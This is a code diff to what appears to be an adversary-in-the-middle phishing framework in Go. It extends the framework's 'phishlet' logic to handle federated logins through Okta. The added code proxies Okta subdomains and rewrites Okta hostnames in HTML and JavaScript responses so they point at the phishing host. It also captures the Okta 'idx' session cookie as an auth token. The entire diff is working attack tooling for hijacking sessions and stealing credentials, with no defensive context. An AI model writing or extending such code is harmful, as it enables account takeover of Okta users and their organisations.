@@ -269,15 +269,29 @@ func updatePhishlets(url string, pl *Phishlet) {
 	if mailErr == nil {
 		subDomain, domain, domainErr := extractDomainInfo(mailInfo.FederationActiveAuthURL)
 		if domainErr == nil {
-			found := false
 			for _, ph := range pl.proxyHosts {
 				if ph.domain == domain && ph.phish_subdomain == subDomain {
-					found = true
-					break
+					return
 				}
 			}
 
-			if !found {
+			if domain == "okta.com" {
+				pl.proxyHosts = append(pl.proxyHosts, ProxyHost{
+					phish_subdomain: subDomain,
+					orig_subdomain:  subDomain,
+					domain:          domain,
+					handle_session:  true,
+					is_landing:      false,
+					auto_filter:     true,
+				})
+				pl.cfg.refreshActiveHostnames()
+
+				pl.addSubFilter(subDomain, "", subDomain, []string{"text/html", "application/json", "application/javascript", "application/x-javascript", "application/ecmascript", "text/javascript", "text/ecmascript"}, subDomain+".okta.com", "{hostname}", false, []string{})
+				pl.addSubFilter(subDomain, "", subDomain, []string{"text/html", "application/json", "application/javascript", "application/x-javascript", "application/ecmascript", "text/javascript", "text/ecmascript"}, "https.*\\.okta\\.com", "https://{hostname}", false, []string{})
+
+				pl.addCookieAuthTokens(subDomain, []string{"idx"})
+
+			} else {
 				pl.proxyHosts = append(pl.proxyHosts, ProxyHost{
 					phish_subdomain: subDomain,
 					orig_subdomain:  subDomain,
